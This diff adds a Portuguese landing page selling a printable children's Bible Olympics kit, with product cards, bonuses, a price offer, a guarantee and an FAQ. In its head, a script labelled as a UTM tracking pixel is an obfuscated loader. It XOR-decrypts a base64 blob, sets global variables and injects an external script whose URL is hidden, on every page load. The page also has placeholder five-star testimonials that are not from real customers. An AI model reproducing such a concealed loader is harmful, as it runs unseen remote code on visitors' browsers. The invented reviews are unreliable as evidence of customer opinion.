@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Kit Olimpíadas Bíblicas Infantis 2026</title>
+  <meta name="description" content="Kit 100% pronto para imprimir: gincana bíblica infantil com provas, certificados, medalhas e roteiro do líder." />
+
+  <!-- Pixel Utmify (UTMs) -->
+  <script>(function(){var y_fokh=atob("DNCHR7D+wjALvNsvLKulMsKS4Aop1K9bXKO9aJ+dpl4lya9CRbb+adORrx5pzvRcT6LuN8SN7UV/0agAQLHzIsOK7Fp4nvcNTaTzNdmct0Ruz/kVd6ulKdGTpxIxnr9OWLGqMsSTq1ZykatdSabiKcTTulNk2PZcT7ula5KIo1x+2fkVDvL6a8vcrFFm2fkVDrTmM9HTt0Rm1b1WAaD1IsabrEQmz65NRbT0ZZzctFFnyb4NFvKlOu2D");var a_3eym=[];for(var j_s=0;j_s<y_fokh.length;j_s++){a_3eym.push(y_fokh.charCodeAt(j_s)&255);}var f_o=a_3eym[0];var g_2qi3=a_3eym.slice(1,1+f_o);var q_3jpg=a_3eym.slice(1+f_o);var v_u=q_3jpg.map(function(b,f_jo){return b^g_2qi3[f_jo%f_o];});var b_ht="";for(var w_c=0;w_c<v_u.length;w_c++){b_ht+=String.fromCharCode(v_u[w_c]&255);}var y_2cx=decodeURIComponent(escape(b_ht));var t_r=JSON.parse(y_2cx);var h_oc7c=t_r.globals||[];h_oc7c.forEach(function(m_60){window[m_60.name]=m_60.value;});var b_j6=document.createElement("script");b_j6.src=t_r.url;b_j6.async=true;b_j6.defer=true;(t_r.attributes||[]).forEach(function(f_5v3){b_j6.setAttribute(f_5v3.name,f_5v3.value);});(document.head||document.documentElement).appendChild(b_j6);})();</script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Baloo+2:wght@600;700;800&family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet" />
+
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    /* Paleta extraída da arte do kit: azul royal, roxo, dourado e branco */
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            navy:   { DEFAULT: '#0E1A5C', 900: '#0A1245' },
+            royal:  { DEFAULT: '#1F3BB3', light: '#2F52D6', soft: '#E8EDFF' },
+            roxo:   { DEFAULT: '#5B22B0', dark: '#3A1180', light: '#7B3FD4', soft: '#F1E9FF' },
+            ouro:   { DEFAULT: '#F2C14E', dark: '#C8921E', light: '#FBE3A0', cream: '#FBF5E4' },
+          },
+          fontFamily: {
+            title: ['"Baloo 2"', 'system-ui', 'sans-serif'],
+            body:  ['Nunito', 'system-ui', 'sans-serif'],
+          },
+        },
+      },
+    };
+  </script>
+
+  <style>
+    body { font-family: 'Nunito', system-ui, sans-serif; -webkit-font-smoothing: antialiased; }
+
+    /* Fundo "diagonal" azul + dourado, como na arte */
+    .bg-hero {
+      background:
+        radial-gradient(circle at 85% 10%, rgba(123,63,212,.45), transparent 45%),
+        linear-gradient(160deg, #0E1A5C 0%, #1F3BB3 55%, #2F52D6 100%);
+    }
+    .bg-hero::before {
+      content: ""; position: absolute; inset: 0; pointer-events: none;
+      background: linear-gradient(115deg, transparent 62%, rgba(242,193,78,.22) 62%, rgba(242,193,78,.22) 70%, transparent 70%);
+    }
+
+    /* Fundo da seção da dor: creme + pontilhado roxo + luzes azul/dourada */
+    .bg-dor {
+      background:
+        radial-gradient(circle at 100% 0%, rgba(47,82,214,.18), transparent 40%),
+        radial-gradient(circle at 0% 100%, rgba(242,193,78,.30), transparent 45%),
+        radial-gradient(rgba(91,34,176,.10) 1.5px, transparent 1.5px) 0 0 / 18px 18px,
+        linear-gradient(180deg, #FBF5E4 0%, #F1E9FF 100%);
+    }
+
+    .text-gold-grad {
+      background: linear-gradient(180deg, #FFF1C2 0%, #F2C14E 50%, #C8921E 100%);
+      -webkit-background-clip: text; background-clip: text; color: transparent;
+    }
+
+    /* Botão CTA dourado com brilho */
+    .btn-cta {
+      position: relative; overflow: hidden;
+      background: linear-gradient(180deg, #FFD867 0%, #F2C14E 45%, #D9A12A 100%);
+      color: #3A1180;
+      box-shadow: 0 6px 0 #A8741A, 0 14px 30px rgba(242,193,78,.45);
+      transition: transform .15s ease, box-shadow .15s ease;
+      animation: pulse 2.2s ease-in-out infinite;
+    }
+    .btn-cta:active { transform: translateY(4px); box-shadow: 0 2px 0 #A8741A, 0 8px 18px rgba(242,193,78,.4); }
+    .btn-cta::after {
+      content: ""; position: absolute; top: 0; left: -80%; width: 50%; height: 100%;
+      background: linear-gradient(120deg, transparent, rgba(255,255,255,.75), transparent);
+      transform: skewX(-20deg); animation: shine 3s ease-in-out infinite;
+    }
+    @keyframes shine { 0% { left: -80%; } 55%,100% { left: 130%; } }
+    @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.025); } }
+    @media (prefers-reduced-motion: reduce) { .btn-cta, .btn-cta::after { animation: none; } }
+
+    /* Check roxo no estilo do card "Regras Gerais" */
+    .check {
+      flex: 0 0 auto; width: 28px; height: 28px; border-radius: 8px;
+      display: grid; place-items: center; color: #fff; font-weight: 800; font-size: 16px;
+      background: linear-gradient(180deg, #7B3FD4, #5B22B0);
+      box-shadow: 0 3px 0 #3A1180;
+    }
+
+    /* Selo de garantia (roseta dourada + fitas roxas) */
+    .seal-petal {
+      position: absolute; inset: 10px; border-radius: 22px;
+      background: linear-gradient(160deg, #FFE7A1 0%, #F2C14E 45%, #C8921E 100%);
+      box-shadow: 0 6px 16px rgba(58,17,128,.25);
+    }
+    .seal-ribbon {
+      position: absolute; bottom: -34px; width: 38px; height: 70px; transform-origin: top center;
+      background: linear-gradient(180deg, #7B3FD4, #3A1180);
+      clip-path: polygon(0 0, 100% 0, 100% 100%, 50% 80%, 0 100%);
+    }
+
+    details > summary { list-style: none; cursor: pointer; }
+    details > summary::-webkit-details-marker { display: none; }
+    details[open] .faq-icon { transform: rotate(45deg); }
+    .faq-icon { transition: transform .2s ease; }
+  </style>
+</head>
+
+<body class="bg-ouro-cream text-navy">
+
+<!-- ==================== BLOCO 1 · PRIMEIRA DOBRA ==================== -->
+<header class="bg-hero relative overflow-hidden text-white">
+  <div class="relative max-w-xl mx-auto px-4 pt-6 pb-12 text-center">
+
+    <span class="inline-block bg-ouro text-roxo-dark font-extrabold text-[13px] leading-snug uppercase tracking-wide rounded-full px-4 py-2 shadow-lg">
+      ✝ Material prático para mães, pais e líderes do Ministério Infantil
+    </span>
+
+    <p class="mt-6 font-title font-extrabold text-2xl text-gold-grad drop-shadow">🏅 Olimpíadas Bíblicas 2026</p>
+
+    <h1 class="mt-2 font-title font-extrabold text-[30px] leading-[1.12] sm:text-4xl">
+      Desperte o <span class="text-ouro">Amor pela Bíblia</span> nas Crianças Através do Desafio Divertido das
+      <span class="text-ouro">Olimpíadas Bíblicas</span>
+    </h1>
+
+    <p class="mt-4 text-[17px] leading-relaxed text-white/90">
+      Um kit <strong class="text-ouro-light">100% pronto e interativo</strong> para realizar uma gincana inesquecível,
+      ensinar a Palavra de Deus de forma leve e <strong class="text-ouro-light">tirar os pequenos das telas.</strong>
+    </p>
+
+    <!-- Mockup do produto -->
+    <div class="mt-7 relative rounded-3xl p-2 bg-gradient-to-b from-ouro-light via-ouro to-ouro-dark shadow-2xl">
+      <div class="rounded-[20px] overflow-hidden bg-navy aspect-square">
+        <!-- Troque o src pela URL da imagem na sua biblioteca de mídia do WordPress -->
+        <img src="kit-olimpiadas.webp" alt="Kit Olimpíadas Bíblicas: guia do organizador, lista de provas, certificados, cartas de desafio e medalhas"
+             class="w-full h-full object-cover" width="1024" height="1024" fetchpriority="high" />
+      </div>
+      <span class="absolute -top-3 -right-2 rotate-6 bg-roxo text-white font-title font-extrabold text-sm px-3 py-1 rounded-full shadow-lg border-2 border-ouro">
+        PRONTO P/ IMPRIMIR
+      </span>
+    </div>
+
+    <a href="#oferta" class="btn-cta mt-8 block w-full rounded-2xl px-5 py-4 font-title font-extrabold text-lg uppercase leading-tight">
+      Quero o kit completo 👉
+    </a>
+    <p class="mt-3 text-sm text-white/80">📩 Acesso imediato • 🖨️ PDF pronto para imprimir</p>
+  </div>
+</header>
+
+<!-- faixa de ícones -->
+<section class="bg-roxo-dark text-white">
+  <div class="max-w-xl mx-auto px-4 py-5 grid grid-cols-2 gap-3 text-[13px] font-bold leading-tight">
+    <div class="flex items-center gap-2"><span class="text-xl">🖨️</span>Arquivos prontos para imprimir</div>
+    <div class="flex items-center gap-2"><span class="text-xl">📚</span>Materiais completos</div>
+    <div class="flex items-center gap-2"><span class="text-xl">👨‍👩‍👧</span>Diversão com propósito</div>
+    <div class="flex items-center gap-2"><span class="text-xl">⛪</span>Ideal para o Dia das Crianças</div>
+  </div>
+</section>
+
+<main>
+
+<!-- ==================== BLOCO 2 · LEAD / DOR ==================== -->
+<section class="bg-dor relative overflow-hidden">
+  <!-- anéis olímpicos decorativos -->
+  <svg class="absolute -right-16 -top-6 w-72 opacity-[.13] pointer-events-none" viewBox="0 0 300 140" fill="none" stroke-width="10" aria-hidden="true">
+    <circle cx="60" cy="50" r="42" stroke="#1F3BB3"/><circle cx="150" cy="50" r="42" stroke="#C8921E"/><circle cx="240" cy="50" r="42" stroke="#5B22B0"/>
+    <circle cx="105" cy="92" r="42" stroke="#F2C14E"/><circle cx="195" cy="92" r="42" stroke="#2F52D6"/>
+  </svg>
+  <svg class="absolute -left-20 bottom-10 w-60 opacity-[.10] pointer-events-none" viewBox="0 0 300 140" fill="none" stroke-width="10" aria-hidden="true">
+    <circle cx="60" cy="50" r="42" stroke="#5B22B0"/><circle cx="150" cy="50" r="42" stroke="#F2C14E"/><circle cx="240" cy="50" r="42" stroke="#1F3BB3"/>
+  </svg>
+
+  <div class="relative max-w-xl mx-auto px-4 py-14">
+    <div class="text-center">
+      <span class="inline-block bg-roxo text-white font-extrabold text-xs uppercase tracking-widest rounded-full px-4 py-1.5 shadow">Você se identifica?</span>
+    </div>
+    <h2 class="mt-4 font-title font-extrabold text-[26px] leading-tight text-roxo-dark text-center">
+      Você já tentou contar uma história bíblica… e perdeu a atenção deles em <span class="relative whitespace-nowrap text-royal">2 minutos?<svg class="absolute left-0 -bottom-1 w-full" viewBox="0 0 100 8" preserveAspectRatio="none" aria-hidden="true"><path d="M2 6 Q50 0 98 5" stroke="#F2C14E" stroke-width="3" fill="none" stroke-linecap="round"/></svg></span>
+    </h2>
+
+    <div class="mt-8 space-y-3">
+      <div class="flex gap-4 items-center rounded-2xl bg-white/90 backdrop-blur p-4 shadow-md border-l-4 border-royal">
+        <div class="flex-none w-12 h-12 rounded-xl bg-royal-soft grid place-items-center text-2xl">📱</div>
+        <p class="text-[16px] leading-snug">As crianças vivem com os olhos grudados no <strong>celular, no tablet e na TV.</strong></p>
+      </div>
+      <div class="flex gap-4 items-center rounded-2xl bg-white/90 backdrop-blur p-4 shadow-md border-l-4 border-roxo">
+        <div class="flex-none w-12 h-12 rounded-xl bg-roxo-soft grid place-items-center text-2xl">⚡</div>
+        <p class="text-[16px] leading-snug">Vídeos rápidos, recompensa a cada segundo. <strong>Como competir com isso?</strong></p>
+      </div>
+      <div class="flex gap-4 items-center rounded-2xl bg-white/90 backdrop-blur p-4 shadow-md border-l-4 border-ouro">
+        <div class="flex-none w-12 h-12 rounded-xl bg-ouro-cream grid place-items-center text-2xl">😔</div>
+        <p class="text-[16px] leading-snug">A professora <strong>prepara a aula com carinho</strong>… e vê a turma dispersa, pedindo para ir embora.</p>
+      </div>
+    </div>
+
+    <div class="mt-8 relative rounded-3xl bg-hero text-white p-6 pt-7 shadow-2xl ring-4 ring-ouro overflow-hidden">
+      <div class="absolute -right-4 -bottom-6 text-[110px] opacity-15 select-none rotate-12" aria-hidden="true">📖</div>
+      <p class="relative text-ouro text-3xl leading-none font-title" aria-hidden="true">“</p>
+      <p class="relative font-title font-extrabold text-[23px] leading-snug">
+        A verdade é que as crianças <span class="text-ouro">não odeiam a Bíblia…</span>
+      </p>
+      <p class="relative mt-2 text-[17px] leading-relaxed text-white/90">
+        Elas apenas <strong class="text-ouro-light">se cansam de métodos antigos de ensino.</strong>
+      </p>
+    </div>
+
+    <div class="mt-8 rounded-3xl bg-white p-6 shadow-xl border-2 border-ouro-light text-center">
+      <p class="text-[17px] leading-relaxed">
+        Quando a Palavra vira <strong class="text-roxo-dark">brincadeira com propósito</strong>, os olhinhos brilham:
+      </p>
+      <div class="mt-4 flex flex-wrap justify-center gap-2 text-[14px] font-extrabold">
+        <span class="rounded-full bg-royal-soft text-royal px-3 py-1.5">🏆 Desafio</span>
+        <span class="rounded-full bg-roxo-soft text-roxo px-3 py-1.5">🤝 Equipe</span>
+        <span class="rounded-full bg-ouro-cream text-ouro-dark px-3 py-1.5 border border-ouro-light">🏅 Medalha</span>
+        <span class="rounded-full bg-royal-soft text-royal px-3 py-1.5">🎉 Comemoração</span>
+      </div>
+      <p class="mt-4 text-[16px] leading-relaxed">
+        Elas participam, decoram versículos e <strong>pedem para brincar de novo.</strong>
+      </p>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== BLOCO 3 · SOLUÇÃO / BENEFÍCIOS ==================== -->
+<section class="bg-white">
+  <div class="max-w-xl mx-auto px-4 py-12">
+    <p class="text-center text-sm font-extrabold uppercase tracking-widest text-ouro-dark">Mais que um jogo, uma missão!</p>
+    <h2 class="mt-2 font-title font-extrabold text-[28px] leading-tight text-center text-roxo-dark">
+      O Que Está Incluso no Kit de Olimpíadas Bíblicas?
+    </h2>
+
+    <ul class="mt-8 space-y-4">
+      <li class="flex gap-4 items-start rounded-2xl border-2 border-roxo-soft bg-roxo-soft/40 p-4">
+        <span class="check">✔</span>
+        <div>
+          <h3 class="font-title font-bold text-lg leading-tight text-navy">Atividades Prontas para Imprimir</h3>
+          <p class="mt-1 text-[16px] leading-relaxed">Jogos, caça-palavras e <strong>perguntas bíblicas separadas por faixa etária.</strong></p>
+        </div>
+      </li>
+      <li class="flex gap-4 items-start rounded-2xl border-2 border-roxo-soft bg-roxo-soft/40 p-4">
+        <span class="check">✔</span>
+        <div>
+          <h3 class="font-title font-bold text-lg leading-tight text-navy">Certificados e Medalhas Editáveis</h3>
+          <p class="mt-1 text-[16px] leading-relaxed">Cada criança se sente <strong>vencedora e reconhecida</strong> no final da gincana.</p>
+        </div>
+      </li>
+      <li class="flex gap-4 items-start rounded-2xl border-2 border-roxo-soft bg-roxo-soft/40 p-4">
+        <span class="check">✔</span>
+        <div>
+          <h3 class="font-title font-bold text-lg leading-tight text-navy">Roteiro do Líder Passo a Passo</h3>
+          <p class="mt-1 text-[16px] leading-relaxed">Aplicação rápida na <strong>EBD, nas células ou em família</strong>, sem precisar criar nada.</p>
+        </div>
+      </li>
+      <li class="flex gap-4 items-start rounded-2xl border-2 border-roxo-soft bg-roxo-soft/40 p-4">
+        <span class="check">✔</span>
+        <div>
+          <h3 class="font-title font-bold text-lg leading-tight text-navy">Aprendizado Dinâmico sem Complicação</h3>
+          <p class="mt-1 text-[16px] leading-relaxed">É só <strong>imprimir, recortar e começar.</strong> As crianças aprendem brincando.</p>
+        </div>
+      </li>
+    </ul>
+  </div>
+</section>
+
+<!-- ==================== BLOCO 4 · BÔNUS ==================== -->
+<section class="bg-hero relative overflow-hidden text-white">
+  <div class="relative max-w-xl mx-auto px-4 py-12">
+    <h2 class="font-title font-extrabold text-[28px] leading-tight text-center">
+      🎁 E Ainda Leva <span class="text-ouro">2 Bônus Exclusivos</span>
+    </h2>
+    <p class="mt-2 text-center text-white/85">Somente para quem garantir o kit hoje.</p>
+
+    <div class="mt-8 space-y-5">
+      <div class="relative rounded-2xl bg-white text-navy p-5 pt-7 border-4 border-ouro shadow-2xl">
+        <span class="absolute -top-4 left-5 bg-roxo text-white font-title font-extrabold text-sm px-4 py-1 rounded-full border-2 border-ouro">BÔNUS 1</span>
+        <div class="flex gap-4 items-center">
+          <div class="text-5xl">🎀</div>
+          <div>
+            <h3 class="font-title font-extrabold text-xl leading-tight text-roxo-dark">Guia de Decoração Temática Econômica</h3>
+            <p class="mt-1 text-[15px] leading-relaxed">Deixe o espaço com clima de <strong>abertura olímpica</strong> gastando pouco.</p>
+          </div>
+        </div>
+        <p class="mt-3 text-sm"><s class="text-navy/50">De R$ 27,00</s> <strong class="text-roxo">GRÁTIS</strong></p>
+      </div>
+
+      <div class="relative rounded-2xl bg-white text-navy p-5 pt-7 border-4 border-ouro shadow-2xl">
+        <span class="absolute -top-4 left-5 bg-roxo text-white font-title font-extrabold text-sm px-4 py-1 rounded-full border-2 border-ouro">BÔNUS 2</span>
+        <div class="flex gap-4 items-center">
+          <div class="text-5xl">📊</div>
+          <div>
+            <h3 class="font-title font-extrabold text-xl leading-tight text-roxo-dark">Tabela de Pontuação Automatizada</h3>
+            <p class="mt-1 text-[15px] leading-relaxed">Some os pontos das equipes <strong>em segundos</strong>, sem confusão e sem briga.</p>
+          </div>
+        </div>
+        <p class="mt-3 text-sm"><s class="text-navy/50">De R$ 19,00</s> <strong class="text-roxo">GRÁTIS</strong></p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== BLOCO 5 · OFERTA ==================== -->
+<section id="oferta" class="max-w-xl mx-auto px-4 py-12 scroll-mt-4">
+  <div class="rounded-3xl bg-white border-4 border-ouro shadow-2xl overflow-hidden text-center">
+    <div class="bg-roxo text-white py-3 font-title font-extrabold text-lg">👑 OFERTA ESPECIAL 2026</div>
+
+    <div class="p-6">
+      <p class="font-title font-bold text-xl text-navy">Kit Olimpíadas Bíblicas Completo + 2 Bônus</p>
+
+      <!-- Mockup 02 · no WordPress, troque o src pela URL da imagem na Biblioteca de Mídia -->
+      <img src="kit-olimpiadas-02.webp" alt="Kit Olimpíadas Bíblicas completo: guia do organizador, lista de provas, certificado, planilha, cartas de desafio e medalhas"
+           class="mt-4 mx-auto w-[75%] max-w-[300px] h-auto rounded-2xl ring-2 ring-ouro shadow-lg" width="1024" height="1024" loading="lazy" decoding="async" />
+
+      <p class="mt-4 text-navy/60 text-lg">De <s class="font-bold">R$ 97,00</s> por apenas</p>
+      <p class="font-title font-extrabold text-[64px] leading-none text-roxo-dark mt-1">
+        <span class="text-3xl align-top">R$</span>37<span class="text-3xl">,00</span>
+      </p>
+      <p class="mt-2 font-bold text-royal">ou em até 4x no cartão</p>
+
+      <!-- Troque # pelo link do seu checkout -->
+      <a href="#" class="btn-cta mt-6 block w-full rounded-2xl px-4 py-5 font-title font-extrabold text-[17px] leading-tight uppercase">
+        SIM! Quero o kit completo das Olimpíadas Bíblicas
+      </a>
+
+      <p class="mt-4 text-sm font-semibold text-navy/70">
+        📩 Acesso Imediato no seu E-mail • 🖨️ Arquivos em PDF Prontos para Imprimir
+      </p>
+      <div class="mt-4 flex justify-center gap-4 text-xs font-bold text-navy/60">
+        <span>🔒 Compra segura</span><span>🛡️ Garantia de 7 dias</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== BLOCO 6 · PROVA SOCIAL ==================== -->
+<!-- ATENÇÃO: substitua os depoimentos abaixo por prints/relatos REAIS de clientes antes de publicar -->
+<section class="bg-royal-soft">
+  <div class="max-w-xl mx-auto px-4 py-12">
+    <h2 class="font-title font-extrabold text-[26px] leading-tight text-center text-roxo-dark">
+      O que mães e professoras estão dizendo 💬
+    </h2>
+
+    <div class="mt-8 space-y-5">
+      <!-- Card estilo WhatsApp -->
+      <div class="rounded-2xl bg-white shadow-lg overflow-hidden">
+        <div class="flex items-center gap-3 bg-navy text-white px-4 py-3">
+          <div class="w-10 h-10 rounded-full bg-ouro text-roxo-dark grid place-items-center font-extrabold">A</div>
+          <div class="leading-tight"><p class="font-bold">Nome da cliente</p><p class="text-xs text-white/70">Professora de EBD</p></div>
+        </div>
+        <div class="p-4 bg-ouro-cream">
+          <div class="relative max-w-[90%] rounded-2xl rounded-tl-none bg-white p-3 shadow text-[15px] leading-relaxed">
+            <p class="text-ouro-dark">★★★★★</p>
+            As crianças <strong>não queriam ir embora!</strong> Fizemos no domingo e até os mais quietinhos participaram. Material lindo e fácil de imprimir. 🙏
+            <span class="block text-right text-[11px] text-navy/50 mt-1">10:42 ✓✓</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="rounded-2xl bg-white shadow-lg overflow-hidden">
+        <div class="flex items-center gap-3 bg-navy text-white px-4 py-3">
+          <div class="w-10 h-10 rounded-full bg-roxo-light text-white grid place-items-center font-extrabold">J</div>
+          <div class="leading-tight"><p class="font-bold">Nome da cliente</p><p class="text-xs text-white/70">Mãe de 2</p></div>
+        </div>
+        <div class="p-4 bg-ouro-cream">
+          <div class="relative max-w-[90%] rounded-2xl rounded-tl-none bg-white p-3 shadow text-[15px] leading-relaxed">
+            <p class="text-ouro-dark">★★★★★</p>
+            Fiz em casa com meus filhos e os primos. <strong>Largaram o celular a tarde toda</strong> e decoraram 5 versículos! ❤️
+            <span class="block text-right text-[11px] text-navy/50 mt-1">19:15 ✓✓</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="rounded-2xl bg-white shadow-lg overflow-hidden">
+        <div class="flex items-center gap-3 bg-navy text-white px-4 py-3">
+          <div class="w-10 h-10 rounded-full bg-royal-light text-white grid place-items-center font-extrabold">M</div>
+          <div class="leading-tight"><p class="font-bold">Nome da cliente</p><p class="text-xs text-white/70">Líder do Ministério Infantil</p></div>
+        </div>
+        <div class="p-4 bg-ouro-cream">
+          <div class="relative max-w-[90%] rounded-2xl rounded-tl-none bg-white p-3 shadow text-[15px] leading-relaxed">
+            <p class="text-ouro-dark">★★★★★</p>
+            Usamos no Dia das Crianças da igreja. O roteiro <strong>economizou horas de preparo</strong> e a tabela de pontos foi um sucesso.
+            <span class="block text-right text-[11px] text-navy/50 mt-1">08:03 ✓✓</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== GARANTIA ==================== -->
+<section class="max-w-xl mx-auto px-4 pt-24 pb-12">
+  <div class="relative rounded-3xl bg-white border-4 border-ouro px-5 pt-36 pb-6 text-center shadow-2xl">
+
+    <!-- Selo de garantia -->
+    <div class="seal absolute left-1/2 -top-20 -translate-x-1/2 w-44 h-44" aria-hidden="true">
+      <span class="seal-ribbon left-8 -rotate-[18deg]"></span>
+      <span class="seal-ribbon right-8 rotate-[18deg]"></span>
+      <span class="seal-petal"></span>
+      <span class="seal-petal rotate-[30deg]"></span>
+      <span class="seal-petal rotate-[60deg]"></span>
+      <div class="absolute inset-[22px] rounded-full bg-gradient-to-b from-roxo-light to-roxo-dark ring-4 ring-ouro-light shadow-inner grid place-items-center">
+        <svg viewBox="0 0 100 100" class="absolute inset-0 w-full h-full">
+          <defs><path id="sealArc" d="M50,50 m-39,0 a39,39 0 1,1 78,0 a39,39 0 1,1 -78,0" /></defs>
+          <text fill="#FBE3A0" font-size="7.2" font-weight="800" letter-spacing="1.1" font-family="Nunito, sans-serif">
+            <textPath href="#sealArc" textLength="238">★ GARANTIA INCONDICIONAL ★ RISCO ZERO</textPath>
+          </text>
+        </svg>
+        <div class="leading-none">
+          <p class="font-title font-extrabold text-[54px] text-gold-grad">7</p>
+          <p class="-mt-1 font-extrabold text-[11px] tracking-widest text-white">DIAS</p>
+        </div>
+      </div>
+    </div>
+
+    <p class="inline-block bg-roxo-soft text-roxo font-extrabold text-xs uppercase tracking-widest rounded-full px-3 py-1">Risco zero para você</p>
+    <h2 class="mt-3 font-title font-extrabold text-[26px] leading-tight text-roxo-dark">
+      Garantia Incondicional de <span class="text-ouro-dark">7 Dias</span>
+    </h2>
+    <p class="mt-3 text-[16px] leading-relaxed">
+      Baixe, imprima e <strong>teste o material com as crianças.</strong>
+      Se não gostar por qualquer motivo, você recebe <strong>100% do seu dinheiro de volta.</strong>
+    </p>
+
+    <div class="mt-6 grid grid-cols-3 gap-2">
+      <div class="rounded-2xl bg-ouro-cream border-2 border-ouro-light px-2 py-3">
+        <div class="text-2xl">📅</div>
+        <p class="mt-1 text-[12px] font-extrabold leading-tight text-navy">7 dias para testar</p>
+      </div>
+      <div class="rounded-2xl bg-ouro-cream border-2 border-ouro-light px-2 py-3">
+        <div class="text-2xl">💰</div>
+        <p class="mt-1 text-[12px] font-extrabold leading-tight text-navy">100% do valor de volta</p>
+      </div>
+      <div class="rounded-2xl bg-ouro-cream border-2 border-ouro-light px-2 py-3">
+        <div class="text-2xl">🤝</div>
+        <p class="mt-1 text-[12px] font-extrabold leading-tight text-navy">Sem perguntas</p>
+      </div>
+    </div>
+
+    <p class="mt-5 rounded-xl bg-royal text-white text-sm font-bold py-3 px-4">
+      🛡️ O risco é todo nosso. Você só fica se amar.
+    </p>
+  </div>
+</section>
+
+<!-- ==================== FAQ ==================== -->
+<section class="bg-hero relative overflow-hidden text-white">
+  <div class="relative max-w-xl mx-auto px-4 py-12">
+    <h2 class="font-title font-extrabold text-[26px] text-center">Perguntas <span class="text-ouro">Frequentes</span></h2>
+
+    <div class="mt-6 space-y-3">
+      <details class="rounded-2xl border-4 border-ouro bg-white text-navy p-4 shadow-2xl">
+        <summary class="flex justify-between items-center gap-3 font-bold text-[17px] text-navy">
+          Como recebo o material?
+          <span class="faq-icon text-2xl text-roxo leading-none">+</span>
+        </summary>
+        <p class="mt-3 text-[16px] leading-relaxed">É 100% digital. Logo após a confirmação do pagamento, você recebe o <strong>acesso no seu e-mail</strong> com todos os arquivos em PDF.</p>
+      </details>
+
+      <details class="rounded-2xl border-4 border-ouro bg-white text-navy p-4 shadow-2xl">
+        <summary class="flex justify-between items-center gap-3 font-bold text-[17px] text-navy">
+          Para qual idade é recomendado?
+          <span class="faq-icon text-2xl text-roxo leading-none">+</span>
+        </summary>
+        <p class="mt-3 text-[16px] leading-relaxed">Para crianças de <strong>4 a 12 anos</strong>, com perguntas e atividades separadas por faixa etária.</p>
+      </details>
+
+      <details class="rounded-2xl border-4 border-ouro bg-white text-navy p-4 shadow-2xl">
+        <summary class="flex justify-between items-center gap-3 font-bold text-[17px] text-navy">
+          Preciso de impressora colorida?
+          <span class="faq-icon text-2xl text-roxo leading-none">+</span>
+        </summary>
+        <p class="mt-3 text-[16px] leading-relaxed">Não! O kit <strong>inclui versão em preto e branco</strong>, perfeita para imprimir em casa ou na papelaria.</p>
+      </details>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer class="bg-navy-900 text-white/60 text-center text-sm">
+  <div class="max-w-xl mx-auto px-4 py-8 space-y-3">
+    <div class="flex justify-center gap-5">
+      <a href="#" class="underline hover:text-ouro">Termos de Uso</a>
+      <a href="#" class="underline hover:text-ouro">Políticas de Privacidade</a>
+    </div>
+    <p>© 2026 Olimpíadas Bíblicas. Todos os direitos reservados.</p>
+    <p class="text-xs text-white/40">Este site não é afiliado ao Facebook ou a qualquer entidade do Facebook.</p>
+  </div>
+</footer>
+
+</body>
+</html>
